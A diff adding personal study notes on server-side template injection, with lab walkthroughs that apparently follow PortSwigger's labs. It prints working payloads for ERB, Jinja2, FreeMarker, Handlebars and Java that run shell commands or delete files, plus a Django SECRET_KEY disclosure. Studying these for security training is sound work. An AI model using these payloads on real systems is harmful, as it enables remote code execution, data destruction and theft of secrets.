@@ -1,0 +1,131 @@
+Server-side template injection:
+- When attacker is able to use native template syntax -> inject malicious payload into template -> executed server-side
+- Template engines are designed to generate web page by combine fixed template + volatile data
+- Arise when user input is concatenated into templates rather than being passed in as data
+
+Example:
+    + Not vuln: $output = $twig->render("Dear {first_name},", array("first_name" => $user.first_name) );
+    + Vuln: $output = $twig->render("Dear " . $_GET['name']);
+
+Construct attack:
+- Detect:
+    + Try fuzzing the template, if exception raised -> injected template syntax is being interpreted by server in some way
+- Plaintext context:
+    + Most template languages allow to freely input content either by using HTML tags directly or template native syntax
+- Code context:
+    + Some way of inject malicious data:
+        + Example 1:
+            code: engine.render("Hello {{"+greeting+"}}", data)
+            payload: /?greeting=data.username
+                    /?greeting=data.username<tag>
+                    /?greeting=data.username}}<tag>
+- Identify:
+    + https://portswigger.net/web-security/images/template-decision-tree.png
+
+Exploit server-side template injection:
+- Read:
+    + Learn the basic template syntax
+    + Read about the security implications
+        + In additional of providing of how to create and use template, it also provide some sort of "Security" section (usually outline all potentially dangerous things people should avoid)
+        + This also acting as a cheatsheet for which beaviors you should look for during auditing, as well as how to exploit them
+        + Even if no dedicated "Security" section, if built in object or function can pose a security risk, there is almost always warning in the document (may not provide much detail, but at least it should flag it)
+        + Example:
+            <%= Dir.entries('/') %>
+            <%= File.open('/example/arbitrary-file').read %>
+    + Look for known exploit:
+        + Key aspect of exploiting is being good at finding additional resources online
+- Explore:
+    + Next step is eplore enviroment and try discover all object which you have access
+    + Many template epose "self" or "enviroment" object. act like namespace contain all objects, methods, attributes that supported by template engine
+    + If it exist, you can use to generate a list of object that are in scope
+    + Example:
+        List all var in enviroments in Java template
+            ${T(java.lang.System).getenv()}
+    + Developer-supplied objects:
+        + Website contain both built-in object provided by template and custom, you should pay attention to these non-standard (cuz they may contain sensitive information or exploitable method)
+        + If can't RCE, you may still gain access to sensitive data or file path traversal
+
+Create a custom attack:
+- Sometimes you will need to construct a custom exploit
+- You may find that template engine executes template inside a sandbox, which make exploitation difficult or even impossible
+- If there no way to exploit, you should review each function for exploitable behavior
+- By working through this process, you may be able to construct a complex attack that even able to exploit more secure target
+
+- Constructing a custom exploit using an object chain:
+    + Identify method which you have access ans which object they return
+    + Combine your own knowledge and information in document, you will be able to put together a shortlist of object that you want to investigate more thoroughly
+    + Example: in Java, you have access to classTool object called $class, document reveal that you can chain the $class.inspect() and $class.type property to obtain references to arbitrary objects
+        $class.inspect("java.lang.Runtime").type.getRuntime().exec("bad-stuff-here")
+
+
+01_Basic_server_side_template_injection
+- Document: https://docs.ruby-lang.org/en/2.3.0/File.html
+- Follow description, we know that website is using ERB template
+- When click product that out of stock, it will return
+    /?message=Unfortunately%20this%20product%20is%20out%20of%20stock
+- First try to identify the SSTI by reading document
+    + https://trustedsec.com/blog/rubyerb-template-injection
+    + Try payload <%= 7 * 7 %> into message to identify vuln
+- Read document, find delete function
+- Payload
+    <%= File.delete('/home/carlos/morale.txt').read %>
+
+02_Basic_server_side_template_injection_(code_context)
+- https://hacktricks.wiki/en/pentesting-web/ssti-server-side-template-injection/index.html?highlight=ssti#jinja2-python
+- Login and go to my-account page, we can see the option of changing display name
+- If you read the api of author display, there will have a param user.name
+    + So we know that it using something like {{ user.name }}
+    + So change it to vuln payload
+- Payload:
+    user.name}}{% import os %}{{__import__('os').popen('rm /home/carlos/morale.txt').read()
+
+03_Server_side_template_injection_using_documentation
+- To identify template engine, use this decision tree
+    https://portswigger.net/web-security/images/template-decision-tree.png
+- When we trigger error by testing payload, it will appear that this is FreeMarker template
+- Payload:
+    <#assign ex="freemarker.template.utility.Execute"?new()>
+    ${ ex("rm /home/carlos/morale.txt") }
+
+04_Server_side_template_injection_in_an_unknown_language_with_a_documented_exploit
+- When click product that out of stock, it will return
+    /?message=Unfortunately%20this%20product%20is%20out%20of%20stock
+- Then try payload in decision tree, it will throw error if payload={{7*7}}
+- Read the error throw out, we know that template engine is Handlebars NodeJS
+- Use this payload in Hacktricks wiki
+    https://hacktricks.wiki/en/pentesting-web/ssti-server-side-template-injection/index.html?highlight=handleb#handlebars-nodejs
+- Payload:  (Need to url encode before paste it in url)
+    {{#with "s" as |string|}}
+        {{#with "e"}}
+            {{#with split as |conslist|}}
+                {{this.pop}}
+                {{this.push (lookup string.sub "constructor")}}
+                {{this.pop}}
+                {{#with string.split as |codelist|}}
+                    {{this.pop}}
+                    {{this.push "return require('child_process').exec('rm /home/carlos/morale.txt');"}}
+                    {{this.pop}}
+                    {{#each conslist}}
+                        {{#with (string.sub.apply 0 codelist)}}
+                            {{this}}
+                        {{/with}}
+                    {{/each}}
+                {{/with}}
+            {{/with}}
+        {{/with}}
+    {{/with}}
+
+05_Server_side_template_injection_with_information_disclosure_via_user_supplied_objects
+- Try to trigger eror in edit template by {{7*7}}
+    + We will know that this website using Django
+- We can using debug to get information leak (require DEBUG+True)
+    + https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Server%20Side%20Template%20Injection/Python.md#django---basic-injection
+    + Notice that we can access settings object
+- Learn what we can access using settings
+    + https://hacktricks.wiki/en/network-services-pentesting/pentesting-web/django.html?highlight=django%20template#server-side-template-injection-ssti
+    + We can see that we can access SECRET_KEY through settings
+- Payload:
+    {{ settings.SECRET_KEY }}
+
+06_Server_side_template_injection_in_a_sandboxed_environment
+- 
